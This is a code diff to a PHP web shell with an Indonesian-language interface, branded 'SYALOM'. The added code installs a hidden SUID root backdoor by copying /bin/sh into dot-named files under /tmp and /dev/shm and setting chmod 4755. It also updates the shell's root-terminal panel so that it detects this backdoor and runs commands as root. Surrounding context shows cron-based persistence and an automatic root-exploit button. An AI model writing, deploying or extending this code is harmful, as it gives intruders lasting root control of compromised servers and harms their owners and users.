@@ -2942,6 +2942,42 @@ function install_persistence_mechanisms() {
     $doc_path = $shell_dir . '/.persistence_doc.txt';
     @file_put_contents($doc_path, $doc_content);
     
+    // 🎯 SUID BACKDOOR - Untuk Interactive Root Terminal
+    // Hanya bisa dibuat jika kita sudah punya root access
+    $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root'];
+    $suid_created = false;
+    $suid_path = '';
+    
+    foreach ($suid_paths as $try_path) {
+        // Coba copy /bin/sh dan set SUID (hanya work kalau root)
+        $copy_result = execute_shell_command("cp /bin/sh $try_path 2>&1 && chmod 4755 $try_path 2>&1 && ls -la $try_path 2>&1");
+        
+        // Check apakah berhasil (harus owned by root dan ada SUID bit)
+        if (strpos($copy_result, 'root') !== false && 
+            (strpos($copy_result, 'rws') !== false || strpos($copy_result, 'rwxs') !== false)) {
+            $suid_created = true;
+            $suid_path = $try_path;
+            break;
+        }
+    }
+    
+    if ($suid_created) {
+        $results['suid_backdoor'] = [
+            'status' => 'installed',
+            'path' => $suid_path,
+            'description' => 'SUID ROOT SHELL - Untuk Interactive Root Terminal',
+            'how_to_use' => "echo 'id' | base64 -d | $suid_path",
+            'note' => 'Jalankan command sebagai root dengan pipe ke SUID shell ini'
+        ];
+    } else {
+        $results['suid_backdoor'] = [
+            'status' => 'failed',
+            'description' => 'SUID ROOT SHELL - Requires root to create',
+            'how_to_use' => 'Need root access to create SUID binary',
+            'note' => 'Klik 🔥 GET ROOT (AUTO) dulu untuk dapatkan root, lalu klik 🔒 Persist lagi'
+        ];
+    }
+    
     return [
         'success' => true,
         'methods' => $results,
@@ -2950,7 +2986,8 @@ function install_persistence_mechanisms() {
         'documentation_file' => $doc_path,
         'documentation_content' => $doc_content,
         'ssh_documentation' => $ssh_doc,
-        'warning' => 'WEB BACKUPS di ' . $shell_dir . ' (' . count($hidden_paths) . ' files) - SYSTEM BACKUPS di /tmp/, /var/tmp/ (' . count($system_backups) . ' files). Jika folder shell dihapus, cron tetap bisa restore dari system backups!'
+        'suid_backdoor' => $suid_created ? $suid_path : null,
+        'warning' => 'WEB BACKUPS di ' . $shell_dir . ' (' . count($hidden_paths) . ' files) - SYSTEM BACKUPS di /tmp/, /var/tmp/ (' . count($system_backups) . ' files). SUID Backdoor: ' . ($suid_created ? $suid_path : 'FAILED (Need root access)')
     ];
 }
 
@@ -3310,7 +3347,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2321</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2338</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7109,17 +7146,17 @@ function showRootTerminal() {
     terminal.style.display = 'block';
     output.innerHTML = `<span style="color:#0f0;font-weight:bold;">🎉 ROOT ACCESS GRANTED!</span>
 <span style="color:#888;">═══════════════════════════════════════</span>
-<span style="color:#ff0;">⚠️  IMPORTANT: Root access is TEMPORARY!</span>
-<span style="color:#ccc;">   The exploit process has ended. To maintain</span>
-<span style="color:#ccc;">   root access, you need a SUID backdoor.</span>
+<span style="color:#ff0;">⚠️  CRITICAL: Root access is TEMPORARY!</span>
+<span style="color:#f44;">   You MUST install persistence WHILE root is active!</span>
 
-<span style="color:#6cf;">📋 HOW TO USE THIS TERMINAL:</span>
-<span style="color:#ccc;">   1. Click 🔒 Persist button (in button row above)</span>
-<span style="color:#ccc;">   2. Wait for SUID backdoor installation to complete</span>
-<span style="color:#ccc;">   3. Return to this terminal</span>
-<span style="color:#ccc;">   4. Type commands as root!</span>
+<span style="color:#6cf;">📋 REQUIRED STEPS (DO NOT CLOSE THIS MODAL):</span>
+<span style="color:#ccc;">   1. Click 🔒 Persist button in the button row ABOVE ↑</span>
+<span style="color:#ccc;">   2. Wait for "SUID backdoor" to show INSTALLED</span>
+<span style="color:#ccc;">   3. This terminal will auto-detect the backdoor</span>
+<span style="color:#ccc;">   4. Then you can type commands as root!</span>
 
-<span style="color:#f80;">⏳ Waiting for persistence installation... (Click 🔒 Persist button above)</span>`;
+<span style="color:#f80;">⏳ Waiting for SUID backdoor installation...</span>
+<span style="color:#f44;">⚠️  Closing this modal = losing root access!</span>`;
     
     // Auto-focus input
     document.getElementById('rootTerminalInput').focus();
@@ -7133,6 +7170,7 @@ function showRootTerminal() {
 
 // Cek apakah SUID backdoor sudah terinstall
 async function checkSuidBackdoor() {
+    // Cek juga di hasil persist yang mungkin baru selesai
     const commonPaths = ['/tmp/.sysd', '/tmp/.hidden_root', '/tmp/.bash', '/dev/shm/.sysd', '/tmp/.al-sysd'];
     const output = document.getElementById('rootTerminalOutput');
     
@@ -7151,21 +7189,25 @@ async function checkSuidBackdoor() {
             const outputEl = doc.querySelector('.output');
             const result = outputEl ? outputEl.textContent : '';
             
-            // Strict check: must contain actual SUID file pattern
-            // Pattern: rws or rwx with s bit, owned by root
-            const hasSuidBit = /rws|root.*root/.test(result);
+            // STRICT check: must be owned by root AND have SUID bit (s in permission)
+            // Example: -rwsr-xr-x 1 root root
+            const hasRootOwner = result.includes('root') && result.includes('root');
+            const hasSuidBit = /rws/.test(result); // s bit di owner execute position
             const hasFile = result.includes(path.split('/').pop());
             const notFound = result.includes('No such file') || result.includes('not found');
             
-            console.log('[RootTerminal] Checking', path, ':', hasSuidBit ? 'FOUND' : 'NOT FOUND', 'Output:', result.substring(0, 100));
+            console.log('[RootTerminal] Checking', path, 'Result:', result.substring(0, 150));
+            console.log('[RootTerminal]   hasRoot:', hasRootOwner, 'hasSUID:', hasSuidBit, 'hasFile:', hasFile, 'notFound:', notFound);
             
-            if (hasSuidBit && hasFile && !notFound) {
+            // ALL conditions must be true
+            if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                 suidBackdoorPath = path;
                 updateTerminalStatus('✅ READY: Type commands below!', '#0f0');
                 
                 // Update output dengan pesan sukses
                 output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED!</span>
 <span style="color:#0f0;">   Path: ${path}</span>
+<span style="color:#0f0;">   Status: Owned by root with SUID bit set</span>
 <span style="color:#6cf;">   Terminal is now fully operational.</span>
 <span style="color:#6cf;">   Type any command and press Enter.</span>\n`;
                 output.scrollTop = output.scrollHeight;
@@ -7176,7 +7218,7 @@ async function checkSuidBackdoor() {
         }
     }
     
-    updateTerminalStatus('⚠️ STEP 1: Click 🔒 Persist button above', '#f80');
+    updateTerminalStatus('⚠️ STEP 1: Click 🔒 Persist button (need root)', '#f80');
 }
 
 // Update status terminal
